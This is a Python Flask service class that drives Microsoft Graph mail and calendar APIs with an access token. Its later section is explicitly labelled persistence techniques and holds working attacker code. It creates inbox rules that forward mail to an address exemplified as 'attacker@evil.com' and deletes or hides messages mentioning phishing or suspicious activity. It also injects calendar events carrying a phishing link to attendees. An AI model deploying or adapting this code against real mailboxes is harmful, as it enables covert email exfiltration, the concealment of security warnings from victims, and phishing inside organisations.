"""
Email service - Microsoft Graph API email operations
"""
import requests
from flask import current_app


class EmailService:
    
    def __init__(self, access_token):
        self.access_token = access_token
        self.base_url = current_app.config['GRAPH_API_BASE']
        self.timeout = current_app.config['GRAPH_API_TIMEOUT']
    
    def _make_request(self, endpoint, method='GET', extra_headers=None, **kwargs):
        url = f"{self.base_url}/{endpoint}"
        headers = {
            'Authorization': f'Bearer {self.access_token}',
            'Content-Type': 'application/json'
        }
        
        # Merge extra headers if provided
        if extra_headers:
            headers.update(extra_headers)
        
        try:
            response = requests.request(
                method,
                url,
                headers=headers,
                timeout=self.timeout,
                **kwargs
            )
            
            if response.status_code in [200, 201, 202, 204]:
                return {
                    'success': True,
                    'data': response.json() if response.content else {},
                    'raw': response.content
                }
            else:
                return {
                    'success': False,
                    'error': f'API returned {response.status_code}',
                    'details': response.text
                }
                
        except requests.exceptions.Timeout:
            return {'success': False, 'error': 'Request timeout'}
        except requests.exceptions.RequestException as e:
            return {'success': False, 'error': str(e)}
    
    def get_folders(self):
        """Get all mail folders"""
        result = self._make_request('me/mailFolders')
        
        if result['success']:
            folders = result['data'].get('value', [])
            return {
                'success': True,
                'folders': [
                    {
                        'id': folder.get('id'),
                        'displayName': folder.get('displayName'),
                        'totalItemCount': folder.get('totalItemCount', 0),
                        'unreadItemCount': folder.get('unreadItemCount', 0),
                        'childFolderCount': folder.get('childFolderCount', 0)
                    }
                    for folder in folders
                ]
            }
        
        return result
    
    def get_all_folders_recursive(self):
        """Get all mail folders including subfolders recursively"""
        def fetch_subfolders(folder_id):
            """Recursively fetch subfolders for a given folder"""
            result = self._make_request(f'me/mailFolders/{folder_id}/childFolders')
            subfolders = []
            
            if result['success']:
                folders = result['data'].get('value', [])
                for folder in folders:
                    folder_data = {
                        'id': folder.get('id'),
                        'displayName': folder.get('displayName'),
                        'totalItemCount': folder.get('totalItemCount', 0),
                        'unreadItemCount': folder.get('unreadItemCount', 0),
                        'childFolderCount': folder.get('childFolderCount', 0),
                        'children': []
                    }
                    
                    # Recursively fetch children if they exist
                    if folder.get('childFolderCount', 0) > 0:
                        folder_data['children'] = fetch_subfolders(folder.get('id'))
                    
                    subfolders.append(folder_data)
            
            return subfolders
        
        # Get top-level folders first
        result = self._make_request('me/mailFolders')
        
        if result['success']:
            folders = result['data'].get('value', [])
            folders_with_children = []
            
            for folder in folders:
                folder_data = {
                    'id': folder.get('id'),
                    'displayName': folder.get('displayName'),
                    'totalItemCount': folder.get('totalItemCount', 0),
                    'unreadItemCount': folder.get('unreadItemCount', 0),
                    'childFolderCount': folder.get('childFolderCount', 0),
                    'children': []
                }
                
                # Fetch subfolders recursively if they exist
                if folder.get('childFolderCount', 0) > 0:
                    folder_data['children'] = fetch_subfolders(folder.get('id'))
                
                folders_with_children.append(folder_data)
            
            return {
                'success': True,
                'folders': folders_with_children
            }
        
        return result
    
    def get_messages(self, top=20, skip=0, folder='inbox'):
        """Get messages from mailbox"""
        endpoint = f'me/mailFolders/{folder}/messages'
        params = f'?$top={top}&$skip={skip}&$orderby=receivedDateTime desc'
        
        result = self._make_request(endpoint + params)
        
        if result['success']:
            messages = result['data'].get('value', [])
            return {
                'success': True,
                'messages': [self._format_message(msg) for msg in messages],
                'count': len(messages)
            }
        
        return result
    
    def get_message_by_id(self, message_id):
        """Get single message with full details"""
        result = self._make_request(f'me/messages/{message_id}')
        
        if result['success']:
            return {
                'success': True,
                'message': self._format_message_full(result['data'])
            }
        
        return result
    
    def get_attachments(self, message_id):
        """Get message attachments list"""
        result = self._make_request(f'me/messages/{message_id}/attachments')
        
        if result['success']:
            attachments = result['data'].get('value', [])
            return {
                'success': True,
                'attachments': [
                    {
                        'id': att.get('id'),
                        'name': att.get('name'),
                        'contentType': att.get('contentType'),
                        'size': att.get('size', 0)
                    }
                    for att in attachments
                ]
            }
        
        return result
    
    def download_attachment(self, message_id, attachment_id):
        """Download attachment content"""
        result = self._make_request(f'me/messages/{message_id}/attachments/{attachment_id}')
        
        if result['success']:
            att_data = result['data']
            import base64
            
            content_bytes = base64.b64decode(att_data.get('contentBytes', ''))
            
            return {
                'success': True,
                'content': content_bytes,
                'name': att_data.get('name'),
                'contentType': att_data.get('contentType')
            }
        
        return result
    
    def send_message(self, to_recipients, subject, body, body_type='HTML'):
        """Send email"""
        message = {
            'message': {
                'subject': subject,
                'body': {
                    'contentType': body_type,
                    'content': body
                },
                'toRecipients': [
                    {'emailAddress': {'address': addr}} 
                    for addr in (to_recipients if isinstance(to_recipients, list) else [to_recipients])
                ]
            },
            'saveToSentItems': True
        }
        
        result = self._make_request('me/sendMail', method='POST', json=message)
        
        if result['success']:
            return {
                'success': True,
                'message': 'Email sent successfully'
            }
        
        return result
    
    def search_messages(self, query, top=20):
        """Search messages - requires ConsistencyLevel header"""
        # NOTE: $orderby is not supported with $search in Microsoft Graph
        endpoint = f'me/messages?$search="{query}"&$top={top}'
        
        # Microsoft Graph requires ConsistencyLevel header for $search queries
        extra_headers = {'ConsistencyLevel': 'eventual'}
        
        result = self._make_request(endpoint, extra_headers=extra_headers)
        
        if result['success']:
            messages = result['data'].get('value', [])
            return {
                'success': True,
                'messages': [self._format_message(msg) for msg in messages],
                'count': len(messages)
            }
        
        return result
    
    def _format_message(self, msg):
        """Format message for list view"""
        return {
            'id': msg.get('id'),
            'subject': msg.get('subject', '(No subject)'),
            'from': msg.get('from', {}).get('emailAddress', {}).get('address', 'Unknown'),
            'fromName': msg.get('from', {}).get('emailAddress', {}).get('name', 'Unknown'),
            'receivedDateTime': msg.get('receivedDateTime'),
            'isRead': msg.get('isRead', False),
            'hasAttachments': msg.get('hasAttachments', False),
            'importance': msg.get('importance', 'normal'),
            'bodyPreview': msg.get('bodyPreview', '')[:200]
        }
    
    def _format_message_full(self, msg):
        """Format full message with body"""
        formatted = self._format_message(msg)
        formatted['body'] = msg.get('body', {}).get('content', '')
        formatted['bodyType'] = msg.get('body', {}).get('contentType', 'text')
        formatted['toRecipients'] = [
            r.get('emailAddress', {}).get('address') 
            for r in msg.get('toRecipients', [])
        ]
        formatted['ccRecipients'] = [
            r.get('emailAddress', {}).get('address') 
            for r in msg.get('ccRecipients', [])
        ]
        
        return formatted
    
    # ============================================================================
    #  PERSISTENCE TECHNIQUES - Mailbox Rules & Calendar Injection
    # ============================================================================
    
    def get_mailbox_rules(self):
        """Get all mailbox rules"""
        result = self._make_request('me/mailFolders/inbox/messageRules')
        
        if result['success']:
            rules = result['data'].get('value', [])
            return {
                'success': True,
                'rules': [
                    {
                        'id': rule.get('id'),
                        'displayName': rule.get('displayName'),
                        'sequence': rule.get('sequence'),
                        'isEnabled': rule.get('isEnabled'),
                        'conditions': rule.get('conditions'),
                        'actions': rule.get('actions')
                    }
                    for rule in rules
                ]
            }
        
        return result
    
    def create_mailbox_rule(self, rule_data):
        """
        Create mailbox rule
        
        rule_data example:
        {
            'displayName': 'Archive Old Items',
            'ruleType': 'forward' | 'delete' | 'move',
            'keywords': ['phishing', 'suspicious'],  # for delete/move
            'forwardTo': 'attacker@evil.com',  # for forward
            'moveToFolder': 'RSS Feeds'  # for move
        }
        """
        rule_type = rule_data.get('ruleType')
        display_name = rule_data.get('displayName', 'Auto Rule')
        
        # Build rule based on type
        if rule_type == 'forward':
            keywords = rule_data.get('keywords', [])
            
            rule = {
                'displayName': display_name,
                'sequence': 1,
                'isEnabled': True,
                'actions': {
                    'forwardTo': [
                        {
                            'emailAddress': {
                                'address': rule_data.get('forwardTo')
                            }
                        }
                    ],
                    'stopProcessingRules': False
                }
            }
            
            # Add conditions only if keywords are specified
            if keywords:
                rule['conditions'] = {
                    'subjectContains': keywords
                }
        
        elif rule_type == 'delete':
            keywords = rule_data.get('keywords', [])
            rule = {
                'displayName': display_name,
                'sequence': 1,
                'isEnabled': True,
                'conditions': {
                    'subjectContains': keywords
                },
                'actions': {
                    'delete': True,
                    'stopProcessingRules': True
                }
            }
        
        elif rule_type == 'move':
            keywords = rule_data.get('keywords', [])
            move_to_folder_id = rule_data.get('moveToFolder')
            
            if not move_to_folder_id:
                return {
                    'success': False,
                    'error': 'moveToFolder (folder ID) is required for move rules'
                }
            
            rule = {
                'displayName': display_name,
                'sequence': 1,
                'isEnabled': True,
                'conditions': {
                    'subjectContains': keywords
                },
                'actions': {
                    'moveToFolder': move_to_folder_id,
                    'stopProcessingRules': True
                }
            }
        
        else:
            return {
                'success': False,
                'error': f'Invalid ruleType: {rule_type}. Must be forward, delete, or move'
            }
        
        result = self._make_request(
            'me/mailFolders/inbox/messageRules',
            method='POST',
            json=rule
        )
        
        if result['success']:
            return {
                'success': True,
                'message': f'{rule_type.capitalize()} rule created successfully',
                'rule': result['data']
            }
        
        return result
    
    def delete_mailbox_rule(self, rule_id):
        """Delete mailbox rule"""
        result = self._make_request(
            f'me/mailFolders/inbox/messageRules/{rule_id}',
            method='DELETE'
        )
        
        if result['success']:
            return {
                'success': True,
                'message': 'Rule deleted successfully'
            }
        
        return result
    
    # ============================================================================
    # CALENDAR INJECTION
    # ============================================================================
    
    def get_calendar_events(self, days_ahead=30):
        """
        Get calendar events for a time window around today
        By default: 30 days in the past + 30 days in the future (60 days total window)
        """
        from datetime import datetime, timedelta
        
        # Show PAST + FUTURE events
        # Start from 30 days ago (to show past events)
        # End at 30 days from now (to show future events)
        now = datetime.utcnow()
        start_of_day = now.replace(hour=0, minute=0, second=0, microsecond=0)
        
        # Window: -30 days to +30 days from today
        start_date = (start_of_day - timedelta(days=days_ahead)).isoformat() + 'Z'
        end_date = (start_of_day + timedelta(days=days_ahead)).isoformat() + 'Z'
        
        # Use calendarView - expands recurring events automatically
        endpoint = f"me/calendar/calendarView?startDateTime={start_date}&endDateTime={end_date}&$orderby=start/dateTime&$top=100"
        
        print(f"[DEBUG] Calling Graph API endpoint: {endpoint}")
        print(f"[DEBUG] Start date (30 days ago): {start_date}")
        print(f"[DEBUG] End date (30 days ahead): {end_date}")
        
        result = self._make_request(endpoint)
        
        print(f"[DEBUG] Graph API response success: {result.get('success')}")
        
        if not result['success']:
            print(f"[DEBUG] Graph API ERROR: {result.get('error')}")
            print(f"[DEBUG] Graph API ERROR details: {result.get('details')}")
            return result
        
        events = result['data'].get('value', [])
        
        print(f"[DEBUG] calendarView returned {len(events)} events")
        
        if len(events) > 0:
            print(f"[DEBUG] First event: {events[0].get('subject')} - {events[0].get('start')}")
            print(f"[DEBUG] Last event: {events[-1].get('subject')} - {events[-1].get('start')}")
        else:
            print(f"[DEBUG] Full Graph API response: {result['data']}")
        
        return {
            'success': True,
            'events': [
                {
                    'id': event.get('id'),
                    'subject': event.get('subject'),
                    'start': event.get('start', {}).get('dateTime'),
                    'end': event.get('end', {}).get('dateTime'),
                    'location': event.get('location', {}).get('displayName', ''),
                    'bodyPreview': event.get('bodyPreview', ''),
                    'body': event.get('body', {}).get('content', ''),
                    'bodyType': event.get('body', {}).get('contentType', 'HTML'),
                    'organizer': event.get('organizer', {}).get('emailAddress', {}).get('address', ''),
                    'attendees': [
                        att.get('emailAddress', {}).get('address', '')
                        for att in event.get('attendees', [])
                    ],
                    'isOrganizer': event.get('isOrganizer', False)
                }
                for event in events
            ]
        }
    
        return result
    
    def create_calendar_event(self, event_data):
        """
        Create calendar event
        
        event_data example:
        {
            'subject': 'IT Security Training',
            'start': '2024-12-10T10:00:00',
            'end': '2024-12-10T11:00:00',
            'body': 'Click here for training: https://evil.com/phishing',
            'attendees': ['user1@domain.com', 'user2@domain.com'],
            'location': 'Teams Meeting'
        }
        """
        from datetime import datetime
        
        # Parse start/end times
        start_dt = event_data.get('start')
        end_dt = event_data.get('end')
        
        event = {
            'subject': event_data.get('subject', 'Meeting'),
            'body': {
                'contentType': 'HTML',
                'content': event_data.get('body', '')
            },
            'start': {
                'dateTime': start_dt,
                'timeZone': 'UTC'
            },
            'end': {
                'dateTime': end_dt,
                'timeZone': 'UTC'
            },
            'location': {
                'displayName': event_data.get('location', '')
            },
            'attendees': [
                {
                    'emailAddress': {
                        'address': att
                    },
                    'type': 'required'
                }
                for att in event_data.get('attendees', [])
            ]
        }
        
        result = self._make_request(
            'me/calendar/events',
            method='POST',
            json=event
        )
        
        if result['success']:
            return {
                'success': True,
                'message': 'Calendar event created successfully',
                'event': result['data']
            }
        
        return result
    
    def update_calendar_event(self, event_id, event_data):
        """Update existing calendar event"""
        update_data = {}
        
        if 'subject' in event_data:
            update_data['subject'] = event_data['subject']
        
        if 'body' in event_data:
            update_data['body'] = {
                'contentType': 'HTML',
                'content': event_data['body']
            }
        
        if 'location' in event_data:
            update_data['location'] = {
                'displayName': event_data['location']
            }
        
        result = self._make_request(
            f'me/calendar/events/{event_id}',
            method='PATCH',
            json=update_data
        )
        
        if result['success']:
            return {
                'success': True,
                'message': 'Event updated successfully'
            }
        
        return result
    
    def delete_calendar_event(self, event_id):
        """Delete calendar event"""
        result = self._make_request(
            f'me/calendar/events/{event_id}',
            method='DELETE'
        )
        
        if result['success']:
            return {
                'success': True,
                'message': 'Event deleted successfully'
            }
        
        return result
